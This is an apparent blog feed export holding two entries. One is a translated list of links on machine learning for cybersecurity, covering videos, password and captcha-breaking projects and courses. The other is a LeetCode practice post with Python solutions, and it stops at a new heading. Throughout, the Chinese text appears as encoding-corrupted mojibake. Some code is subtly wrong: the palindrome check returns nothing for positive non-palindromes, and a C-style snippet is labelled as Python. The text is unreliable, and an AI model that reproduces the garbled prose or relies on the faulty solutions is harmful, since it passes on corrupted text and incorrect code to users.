<p>ç›®å‰äº’è”ç½‘ä¸Šå­˜åœ¨ç€å„ç§å„æ ·çš„ç½‘ç»œå®‰å…¨çš„æ¢æµ‹ç³»ç»Ÿï¼Œä½†æ˜¯ç”¨æˆ·å¯¹å®ƒä»¬è¤’è´¬ä¸ä¸€ï¼Œç©¶ç«Ÿå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªæ¢æµ‹ç³»ç»Ÿçš„å¯é æ€§ï¼Œè§†é¢‘ä»‹ç»äº†ä¸€ç§å®ç”¨çš„åˆ¤æ–­æ–¹æ³•ï¼Œæ—¶é•¿çº¦40åˆ†é’Ÿã€‚</p>
<p><a href="https://www.youtube.com/watch?v=6JMEKnes-w0"><strong>5. Data-Driven Threat Intelligence: Metrics On Indicator Dissemination And Sharing</strong></a></p>
<p>è§†é¢‘ä»‹ç»äº†æ•°æ®é©±åŠ¨ä¸‹çš„å®‰å…¨æƒ…æŠ¥åˆ†æï¼Œç‰¹åˆ«æ˜¯å’Œç¤¾äº¤ç½‘ç»œåˆ†äº«å’Œä¼ æ’­ç›¸å…³çš„ï¼Œæ—¶é•¿çº¦48åˆ†é’Ÿã€‚</p>
<p><strong><a href="https://www.youtube.com/watch?v=dGwH7m4N8DE">6. Applied Machine Learning for Data Exfil and Other Fun Topics</a></strong></p>
<p>ä¸ºäº†å¸®åŠ©ç½‘ç»œå®‰å…¨ç›¸å…³çš„ç ”ç©¶è€…ã€åˆ†æå¸ˆå’Œæå®¢çˆ±å¥½è€…äº†è§£æœºå™¨å­¦ä¹ ï¼Œä»¥åŠå¦‚ä½•å°†æœºå™¨å­¦ä¹ åº”ç”¨åœ¨ç½‘ç»œå®‰å…¨ä¸­é¢†åŸŸä¸­ï¼Œä¾‹å¦‚æ•°æ®æ³„éœ²ï¼Œæœ¬è§†é¢‘åšäº†è¯¦ç»†ä»‹ç»ï¼Œæ—¶é•¿çº¦43åˆ†é’Ÿã€‚</p>
<p><a href="https://www.youtube.com/watch?v=TYVCVzEJhhQ"><strong>7. Secure Because Math: A Deep-Dive on ML-Based Monitoring</strong></a></p>
<p>è§†é¢‘ä»‹ç»äº†ä»¥æœºå™¨å­¦ä¹ æŠ€æœ¯ä¸ºåŸºç¡€çš„äº’è”ç½‘ç›‘æ§ï¼Œæ—¶é•¿çº¦46åˆ†é’Ÿã€‚</p>
<p><a href="https://www.youtube.com/watch?v=JAGDpJFFM2A"><strong>8. Machine Duping 101: Pwning Deep Learning Systems</strong></a></p>
<p>44åˆ†é’Ÿæ•™ä½ æ”»å…‹ä¸€ä¸ªæ·±åº¦å­¦ä¹ ç³»ç»Ÿï¼Œå¿…çœ‹ç³»åˆ—ã€‚</p>
<p><a href="https://www.youtube.com/watch?v=l7U0pDcsKLg"><strong>9. Weaponizing Data Science for Social Engineering</strong></a></p>
<p>è§†é¢‘ä»‹ç»äº†ç¤¾äº¤ç½‘ç»œä¸­çš„æ¶æ„æ”»å‡»è¡Œä¸ºå’Œæ•°æ®ç§‘å­¦å¯¹æ­¤å¯èƒ½å‘æŒ¥çš„ä½œç”¨ï¼Œæ—¶é•¿çº¦44åˆ†é’Ÿã€‚</p>
<p><strong><a href="https://www.youtube.com/watch?v=oiuS1DyFNd8">10. Defeating Machine Learning What Your Security Vendor Is Not Telling You</a></strong></p>
<p>è¿˜æ˜¯å…³äºæ”»ç ´æœºå™¨å­¦ä¹ çš„è¯é¢˜ï¼Œè§†é¢‘ä»‹ç»äº†å¦‚ä½•æ”»ç ´ä»¥æœºå™¨å­¦ä¹ ä¸ºåŸºç¡€çš„äº’è”ç½‘å®‰å…¨äº§å“ï¼Œæ—¶é•¿çº¦50åˆ†é’Ÿã€‚</p>
<p><a href="https://www.youtube.com/watch?v=u6a7afsD39A"><strong>11. CrowdSource: Crowd Trained Machine Learning Model for Malware Capability Det</strong></a></p>
<p>è§†é¢‘ä»‹ç»äº†å¦‚ä½•åˆ©ç”¨æœºå™¨å­¦ä¹ æ¨¡å‹æ¥æ¢æµ‹äº’è”ç½‘å®‰å…¨ï¼Œæ—¶é•¿çº¦28åˆ†é’Ÿã€‚</p>
<p><strong><a href="https://www.youtube.com/watch?v=sPtbDUJjhbk">12. Defeating Machine Learning: Systemic Deficiencies for Detecting Malware</a></strong></p>
<p>ç³»ç»Ÿçš„â€œç¼ºé™·â€ä¹Ÿèƒ½ç”¨æ¥æ¢æµ‹æ¶æ„è½¯ä»¶ï¼Ÿè¿™ä¸ªè§†é¢‘ç”¨45åˆ†é’Ÿä¸ºä½ è¯¦ç»†è®²è§£åˆ©ç”¨æœºå™¨å­¦ä¹ å’Œç³»ç»Ÿâ€œç¼ºé™·â€æ¥æ¢æµ‹æ¶æ„è½¯ä»¶çš„æ–¹æ³•ã€‚</p>
<p><a href="https://www.youtube.com/watch?v=2cQRSPFSY-s"><strong>13. Packet Capture Village â€“ Theodora Titonis â€“ How Machine Learning Finds Malware</strong></a></p>
<p>è§†é¢‘ä»‹ç»äº†å¦‚ä½•åˆ©ç”¨æœºå™¨å­¦ä¹ æ¢æµ‹ç§»åŠ¨ç«¯æ¶æ„è½¯ä»¶ï¼Œæ—¶é•¿çº¦44åˆ†é’Ÿã€‚</p>
<p><strong><a href="https://www.youtube.com/watch?v=iLNHVwSu9EA&amp;t=245s">14. Build an Antivirus in 5 Min â€“ Fresh Machine Learning</a></strong></p>
<p>è§†é¢‘ç”¨5åˆ†é’Ÿä»‹ç»äº†å¦‚ä½•ç”¨äº’è”ç½‘ä¸Šå¼€æºçš„æœºå™¨å­¦ä¹ æ¡†æ¶ç¼–å†™ä¸€ä¸ªå…¨æ–°çš„é˜²ç—…æ¯’ç¨‹åºã€‚</p>
<p><a href="https://www.youtube.com/watch?v=zT-4zdtvR30"><strong>15. Hunting for Malware with Machine Learning</strong></a></p>
<p>è§†é¢‘ä»‹ç»äº†é’ˆå¯¹ä¼ä¸šç”¨æˆ·çš„è‡ªåŠ¨åŒ–æ¶æ„è½¯ä»¶æ¢æµ‹ç³»ç»Ÿï¼Œæ—¶é•¿çº¦48åˆ†é’Ÿã€‚</p>
<h2 id="é¡¹ç›®å’Œæ•™ç¨‹">é¡¹ç›®å’Œæ•™ç¨‹</h2>
<p><a href="https://clicksecurity.github.io/data_hacking/"><strong>1. Click Security Data Hacking Project</strong></a></p>
<p>è¯¥é¡¹ç›®åŒ…å«äº†ä¸€ç³»åˆ—ä¸IPythonã€Pandasã€Scikit Learnç›¸å…³çš„ç»ƒä¹ ï¼ŒåŒ…å«ç¬”è®°å’ŒåŸä»£ç ï¼Œæ¯ä¸ªç»ƒä¹ éƒ½ä¼šæ•…æ„è®¾ç½®ä¸€äº›å¸¸è§çš„ä»£ç é”™è¯¯ã€æ•°æ®åº“é”™è¯¯å’Œé€»è¾‘é”™è¯¯ä¾›ä½¿ç”¨è€…æ”¹æ­£ã€‚è¯¥ç³»åˆ—æ•™ç¨‹å‡ ä¹æ˜¯æœºå™¨å­¦ä¹ åœ¨ä¿¡æ¯å®‰å…¨é¢†åŸŸåº”ç”¨çš„å¿…å­¦æ•™ç¨‹ã€‚</p>
<p><a href="http://fsecurify.com/using-neural-networks-to-generate-human-readable-passwords/"><strong>2. Using Neural Networks to generate human readable passwords</strong></a></p>
<p>é“¾æ¥ä¸­æ˜¯ä¸€ä½å¤§ç¥è‡ªå·±ç¼–å†™çš„ä¸€ä¸ªåŸºäºKerasæ¡†æ¶å’Œpythonè¯­è¨€çš„å¯†ç ç”Ÿæˆå™¨ï¼Œåˆ©ç”¨äº†æ·±åº¦ç¥ç»ç½‘ç»œåŸç†ï¼Œåœ¨ä¿è¯å¯†ç å®‰å…¨æ€§çš„åŒæ—¶ä¹Ÿä¿è¯äº†æ˜“è¯»æ€§ã€‚è¯¥é¡¹ç›®çš„ä»£ç å·²ç»åœ¨Githubä¸Šå¼€æºï¼Œå¯ä»¥ç»“åˆä¸Šæ–‡æåˆ°çš„è®ºæ–‡<a href="https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/melicher">ã€ŠFast, Lean, and Accurate: Modeling Password Guessability Using Neural Networksã€‹</a>ä¸€èµ·å­¦ä¹ ã€‚</p>
<p>åŸä»£ç ï¼š<a href="https://github.com/fchollet/keras/blob/master/examples/lstm_text_generation.py">é“¾æ¥</a></p>
<p><a href="http://fsecurify.com/machine-learning-based-password-strength-checking/"><strong>3. Machine Learning based Password Strength Classification</strong></a></p>
<p>è¯¥é¡¹ç›®å…³äºç”¨æœºå™¨å­¦ä¹ ç®—æ³•åˆ¤æ–­ä¸€ä¸ªå·²çŸ¥å¯†ç çš„å¥å£®æ€§ï¼Œä»£ç å·²ç»åœ¨Githubä¸Šå¼€æºã€‚</p>
<p>æºä»£ç ï¼š<a href="https://github.com/faizann24/Machine-Learning-based-Password-Strength-Classification/tree/master">é“¾æ¥</a></p>
<p><a href="http://fsecurify.com/using-machine-learning-detect-malicious-urls/"><strong>4. Using Machine Learning to Detect Malicious URLs</strong></a></p>
<p>è¯¥é¡¹ç›®å…³äºå¦‚ä½•åˆ©ç”¨æœºå™¨å­¦ä¹ æ¢æµ‹æ¶æ„çš„äº’è”ç½‘é“¾æ¥åœ°å€ï¼Œæ®ç§°å¯ä»¥è¾¾åˆ°98%çš„æ­£ç¡®ç‡ã€‚</p>
<p>æºä»£ç ï¼š<a href="https://github.com/faizann24/Using-machine-learning-to-detect-malicious-URLs">é“¾æ¥</a></p>
<p><a href="http://www.kdnuggets.com/2015/12/big-data-science-security-fraud-detection.html"><strong>5. Big Data and Data Science for Security and Fraud Detection</strong></a></p>
<p>è¿™æ˜¯ä¸€ç¯‡ç»¼è¿°æ–‡ç« ï¼Œæ–‡ä¸­ä»‹ç»äº†å¤šä¸ªå›½å®¶/åœ°åŒº/å¤§å…¬å¸æ­£åœ¨ä½¿ç”¨æˆ–ç ”å‘çš„å¤§æ•°æ®åˆ†æå·¥å…·å’ŒæŠ€æœ¯ï¼Œè¿™äº›æŠ€æœ¯ç»“åˆäº†æ–‡æœ¬æŒ–æ˜ã€æœºå™¨å­¦ä¹ æˆ–è€…ç½‘ç»œåˆ†æï¼Œèƒ½å¤Ÿåœ¨æ—©æœŸé˜¶æ®µå¯¹ç½‘ç»œå®‰å…¨å¨èƒè¿›è¡Œæ£€æµ‹å’Œé¢„é˜²ã€‚</p>
<p><a href="https://deepmlblog.wordpress.com/2016/01/03/how-to-break-a-captcha-system/"><strong>6. Using deep learning to break a Captcha system</strong></a></p>
<p>è¿™æ˜¯ä¸€ç¯‡åšå®¢æ–‡ç« ï¼Œä»‹ç»äº†å¦‚ä½•åˆ©ç”¨æ·±åº¦å­¦ä¹ æŠ€æœ¯ç ´è§£çƒ¦äººçš„éªŒè¯ç ç³»ç»Ÿï¼Œä½œè€…åœ¨æ–‡ä¸­ç»™å‡ºäº†éƒ¨åˆ†å…³é”®åŠŸèƒ½æ¨¡å—çš„æºä»£ç ï¼Œå¹¶ä¸”åœ¨æ–‡æœ«è¿˜ç»™å‡ºäº†è®¸å¤šå‚è€ƒé“¾æ¥ã€‚</p>
<p><a href="http://web.stanford.edu/class/cs259d/"><strong>7. Data Mining for Cyber Security</strong></a></p>
<p>è¿™æ˜¯æ–¯å¦ç¦å¤§å­¦å¼€è®¾çš„ä¸€ä¸ªç³»åˆ—å…¬å¼€è¯¾ï¼Œå…³äºæ•°æ®æŒ–æ˜åœ¨äº’è”ç½‘å®‰å…¨ä¸­çš„åº”ç”¨ã€‚åœ¨é“¾æ¥ä¸­å¯ä»¥ç›´æ¥çœ‹åˆ°è¯¾ç¨‹å®‰æ’ï¼Œä¸‹è½½åˆ°è®²å¸ˆæ¼”è®²çš„æ–‡æœ¬è®°å½•ã€PPTï¼ŒæŸ¥çœ‹è¯¾åä½œä¸šçš„é¢˜ç›®å’Œæ­¤å‰åŒå­¦ä¸Šä¼ çš„ç­”æ¡ˆï¼Œä»¥åŠè¯¾åçš„æ·±å…¥é˜…è¯»åˆ—è¡¨ã€‚è¿™ä¸€è¯¾ç¨‹å¯èƒ½æ˜¯æ•°æ®ç§‘å­¦ç›®å‰åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸå·²ç»å…¬å¼€çš„æœ€å¥½çš„è¯¾ç¨‹ä¹‹ä¸€ã€‚</p>
<h2 id="å…¶ä»–">å…¶ä»–</h2>
<p><a href="https://news.mit.edu/2016/ai-system-predicts-85-percent-cyber-attacks-using-input-human-experts-0418"><strong>1. System predicts 85 percent of cyber-attacks using input from human experts</strong></a></p>
<p>è¿™æ˜¯ä¸€ç¯‡ç ”ç©¶æˆæœä»‹ç»çš„æ–‡ç« ï¼Œä»‹ç»äº†æ¥è‡ªMITè®¡ç®—æœºç§‘å­¦ä¸äººå·¥æ™ºèƒ½å®éªŒå®¤ï¼ˆCSAILï¼‰å’Œä¸€å®¶æœºå™¨å­¦ä¹ åˆåˆ›å…¬å¸PatternExçš„æœ€æ–°ç ”ç©¶æˆæœï¼šä¸€ä¸ªåä¸ºAI2çš„äººå·¥æ™ºèƒ½å¹³å°ï¼Œèƒ½å¤Ÿæ ¹æ®äººç±»ç½‘ç»œå®‰å…¨ä¸“å®¶è¾“å…¥çš„æ•°æ®ï¼Œå¯¹å½“å‰ç½‘ç»œå¯èƒ½é­åˆ°çš„å®‰å…¨å¨èƒåšå‡ºé¢„æµ‹ï¼Œæ­£ç¡®ç‡é«˜è¾¾85%ï¼Œè¶…è¶Šäº†ç›®å‰å·²çŸ¥çš„å…¶ä»–åŒç±»é¢„æµ‹ç³»ç»Ÿã€‚æ–‡ä¸­é€šè¿‡æ–‡å­—å’Œè§†é¢‘çš„æ–¹å¼è®²è§£äº†è¿™ä¸€é¢„æµ‹ç³»ç»Ÿçš„åŸºæœ¬å·¥ä½œåŸç†ã€‚</p>
<p><a href="http://www.mlsecproject.org/#open-source-projects"><strong>2. MLSec</strong></a></p>
<p>è¿™æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ç›¸å…³çš„ç½‘ç«™ï¼Œè¯¥ç½‘ç«™èšåˆäº†ä¸€ç³»åˆ—å°†æœºå™¨å­¦ä¹ æŠ€æœ¯åº”ç”¨äºç½‘ç»œå®‰å…¨é¢†åŸŸçš„å¼€æºé¡¹ç›®ï¼ŒåŒæ—¶è¿˜å¼€è®¾äº†åšå®¢æ–‡ç« å’Œç¤¾åŒºè®¨è®ºé¢‘é“ï¼Œå¸®åŠ©å¼€å‘è€…å¯¹è¿™äº›é¡¹ç›®æ·±å…¥ç†è§£ã€‚</p>
<p><a href="http://blog.sqrrl.com/an-introduction-to-machine-learning-for-cybersecurity-and-threat-hunting"><strong>3. An Introduction to Machine Learning for Cybersecurity and Threat Hunting</strong></a></p>
<p>è¿™æ˜¯ä¸€ç¯‡æ·±åº¦æ–‡ç« ï¼Œé€šè¿‡ä¸å‡ ä½æ•°æ®ç§‘å­¦å¤§ç‰›è®¿è°ˆçš„å½¢å¼ï¼Œè¯¦ç»†ä»‹ç»äº†æœºå™¨å­¦ä¹ å’Œç½‘ç»œå®‰å…¨çš„å…³ç³»ä»¥åŠç›¸å…³åº”ç”¨ã€‚</p>
<p>ä»¥ä¸Šåªæ˜¯è¿™ä½å¤–å›½å¤§ç‰›çš„æ€»ç»“ï¼Œå¦‚æœä½ æ‰‹é‡Œä¹Ÿæœ‰ä¸€äº›å€¼å¾—å®‰åˆ©çš„å¹²è´§å’Œèµ„æºï¼Œä¸å¦¨åœ¨æ–‡æœ«ç•™è¨€åˆ†äº«å‡ºæ¥å§ï¼</p>
<p><em>é™„åŸæ–‡ä½œè€…ç®€ä»‹ï¼šFaizan Ahmadï¼ŒFulbright è®¡åˆ’å¤§å­¦ç”Ÿï¼Œç›®å‰åœ¨å·´åŸºæ–¯å¦å›½ç«‹è®¡ç®—æœºä¸æ–°å…´ç§‘å­¦å¤§å­¦ï¼ˆNational University of Computer and Emerging ScienCESï¼‰å­¦ä¹ ï¼ŒåŒæ—¶åœ¨å·´åŸºæ–¯å¦çš„æ‹‰åˆå°”ç®¡ç†ç§‘å­¦å¤§å­¦ï¼ˆLahore University of Management Sciencesï¼‰æ‹…ä»»ç ”ç©¶åŠ©ç†ï¼Œä¸»æ”»è®¡ç®—æœºå’Œç½‘ç»œå®‰å…¨ç ”ç©¶æ–¹å‘ã€‚</em></p>
<p>æ¥æºï¼š<a href="http://www.kdnuggets.com/2017/01/machine-learning-cyber-security.html">kdnuggets</a></p>
]]></content>
      <categories>
        <category>æœºå™¨å­¦ä¹ </category>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>æœºå™¨å­¦ä¹ </tag>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode_Primary-class</title>
    <url>/Algorithm/1.Leetcode-Primary-class/</url>
    <content><![CDATA[<h1 id="Leetcode-Primary-Class">Leetcode Primary Class</h1>
<h2 id="1-two-sum-ä¸¤æ•°ä¹‹å’Œ">#1 two-sum ä¸¤æ•°ä¹‹å’Œ</h2>
<h3 id="Question">Question</h3>
<p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶è¿”å›ä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚</p>
<p>ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œä½ ä¸èƒ½é‡å¤åˆ©ç”¨è¿™ä¸ªæ•°ç»„ä¸­åŒæ ·çš„å…ƒç´ ã€‚</p>
<h3 id="Example">Example</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç»™å®š nums &#x3D; [2, 7, 11, 15], target &#x3D; 9</span><br><span class="line"></span><br><span class="line">å› ä¸º nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9</span><br><span class="line">æ‰€ä»¥è¿”å› [0, 1]</span><br></pre></td></tr></table></figure>
<h3 id="Solution">Solution</h3>
<h4 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums, target</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">        	left = target-value</span><br><span class="line">        	<span class="keyword">if</span> left <span class="keyword">in</span> nums[(index+<span class="number">1</span>):]:</span><br><span class="line">        		left_index = nums.index(left)</span><br><span class="line">        		<span class="keyword">if</span> index == left_index:</span><br><span class="line">        			left_index = left_index + nums[left_index+<span class="number">1</span>:].index(left) + <span class="number">1</span></span><br><span class="line">        		<span class="keyword">return</span> [index, left_index]</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ</h4>
<p>å‚è€ƒäº†å¤§ç¥ä»¬çš„è§£æ³•ï¼Œé€šè¿‡å“ˆå¸Œæ¥æ±‚è§£ï¼Œè¿™é‡Œé€šè¿‡å­—å…¸æ¥æ¨¡æ‹Ÿå“ˆå¸ŒæŸ¥è¯¢çš„è¿‡ç¨‹ã€‚<br>
ä¸ªäººç†è§£è¿™ç§åŠæ³•ç›¸è¾ƒäºæ–¹æ³•ä¸€å…¶å®å°±æ˜¯å­—å…¸è®°å½•äº† num1 å’Œ num2 çš„å€¼å’Œä½ç½®ï¼Œè€Œçœäº†å†æŸ¥æ‰¾ num2 ç´¢å¼•çš„æ­¥éª¤ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums, target</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hashmap = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">        	hashmap[value] = key</span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">            j = hashmap.get(target - num)</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> j != i:</span><br><span class="line">                <span class="keyword">return</span> [i, j]</span><br></pre></td></tr></table></figure>
<h2 id="7-reverse-integer-æ•´æ•°åè½¬">#7 reverse-integer æ•´æ•°åè½¬</h2>
<h3 id="Question-v2">Question</h3>
<p>ç»™å‡ºä¸€ä¸ª 32 ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œä½ éœ€è¦å°†è¿™ä¸ªæ•´æ•°ä¸­æ¯ä½ä¸Šçš„æ•°å­—è¿›è¡Œåè½¬ã€‚</p>
<blockquote>
<p>æ³¨æ„:</p>
<p>å‡è®¾æˆ‘ä»¬çš„ç¯å¢ƒåªèƒ½å­˜å‚¨å¾—ä¸‹ 32 ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œåˆ™å…¶æ•°å€¼èŒƒå›´ä¸º [âˆ’231,  231 âˆ’ 1]ã€‚è¯·æ ¹æ®è¿™ä¸ªå‡è®¾ï¼Œå¦‚æœåè½¬åæ•´æ•°æº¢å‡ºé‚£ä¹ˆå°±è¿”å› 0ã€‚</p>
</blockquote>
<h3 id="Example-v2">Example</h3>
<p>ç¤ºä¾‹ 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: 123</span><br><span class="line">è¾“å‡º: 321</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: -123</span><br><span class="line">è¾“å‡º: -321</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ 3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: 120</span><br><span class="line">è¾“å‡º: 21</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v2">Solution</h3>
<h4 id="æ–¹æ³•ä¸€-v2">æ–¹æ³•ä¸€</h4>
<p>é¦–å…ˆæƒ³åˆ°çš„è‚¯å®šæ˜¯å°†<code>int</code>ç±»å‹è½¬æ¢æˆ<code>str</code>ç±»å‹ï¼Œé€†ç½®åå†è½¬æ¢æˆ<code>int</code>ç±»å‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            x = int(str(x)[::<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x= int(<span class="string">&#x27;-&#x27;</span> + str(abs(x))[::<span class="number">-1</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">2</span>**<span class="number">31</span> <span class="keyword">and</span> x &gt; <span class="number">-2</span>**<span class="number">31</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>è¿™ä¸ªä»£ç æœ€å·§å¦™çš„åœ°æ–¹å°±åœ¨äºä½¿ç”¨äº†<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017269965565856">åˆ‡ç‰‡</a>è¿™ç§ç‰¹æ€§æ¥ç›´æ¥é€†ç½®å­—ç¬¦ä¸²ã€‚</strong></p>
<h4 id="æ–¹æ³•äºŒ-v2">æ–¹æ³•äºŒ</h4>
<p>æˆ‘ä»¬æƒ³é‡å¤â€œå¼¹å‡ºâ€ xçš„æœ€åä¸€ä½æ•°å­—ï¼Œå¹¶å°†å®ƒâ€œæ¨å…¥â€åˆ° rev çš„åé¢ã€‚æœ€åï¼Œrev å°†ä¸ xç›¸åã€‚</p>
<p>è¦åœ¨æ²¡æœ‰è¾…åŠ©å †æ ˆ / æ•°ç»„çš„å¸®åŠ©ä¸‹ â€œå¼¹å‡ºâ€ å’Œ â€œæ¨å…¥â€ æ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°å­¦æ–¹æ³•ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//pop operation:</span><br><span class="line">pop = x % <span class="number">10</span>;</span><br><span class="line">x /= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">//push operation:</span><br><span class="line">temp = rev * <span class="number">10</span> + pop;</span><br><span class="line">rev = temp;</span><br></pre></td></tr></table></figure>
<h3 id="Extra">Extra</h3>
<ol>
<li>
<p>æ•°å€¼äº¤æ¢ï¼š<code>x, y = y, x</code></p>
</li>
<li>
<p>int to listï¼š<code>l = [int(x) for x in str(num)]</code></p>
</li>
<li>
<p>list to intï¼š</p>
<ul>
<li>
<p>ä½¿ç”¨åˆ—è¡¨ç”Ÿæˆå™¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [str(i) <span class="keyword">for</span> i <span class="keyword">in</span> list]</span><br><span class="line">res = int(<span class="string">&#x27;&#x27;</span>.join(s))</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ä½¿ç”¨<code>map</code>å‡½æ•°ï¼š<code>res = int(''.join(map(str, list)))</code></p>
</li>
</ul>
</li>
</ol>
<h2 id="9-palindrome-number-å›æ–‡æ•°">#9 palindrome-number å›æ–‡æ•°</h2>
<h3 id="Question-v3">Question</h3>
<p>åˆ¤æ–­ä¸€ä¸ªæ•´æ•°æ˜¯å¦æ˜¯å›æ–‡æ•°ã€‚å›æ–‡æ•°æ˜¯æŒ‡æ­£åºï¼ˆä»å·¦å‘å³ï¼‰å’Œå€’åºï¼ˆä»å³å‘å·¦ï¼‰è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•´æ•°ã€‚</p>
<h3 id="Example-v3">Example</h3>
<ul>
<li>
<p>ç¤ºä¾‹ 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: 121</span><br><span class="line">è¾“å‡º: true</span><br><span class="line">ç¤ºä¾‹ 2:</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ç¤ºä¾‹2ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: -121</span><br><span class="line">è¾“å‡º: false</span><br><span class="line">è§£é‡Š: ä»å·¦å‘å³è¯», ä¸º -121 ã€‚ ä»å³å‘å·¦è¯», ä¸º 121- ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ç¤ºä¾‹3ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: 10</span><br><span class="line">è¾“å‡º: false</span><br><span class="line">è§£é‡Š: ä»å³å‘å·¦è¯», ä¸º 01 ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Solution-v3">Solution</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPalindrome</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            y = int(str(x)[::<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">if</span> x == y:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h2 id="13-roman-to-integer-ç½—é©¬æ•°å­—è½¬æ•´æ•°">#13_roman-to-integer ç½—é©¬æ•°å­—è½¬æ•´æ•°</h2>
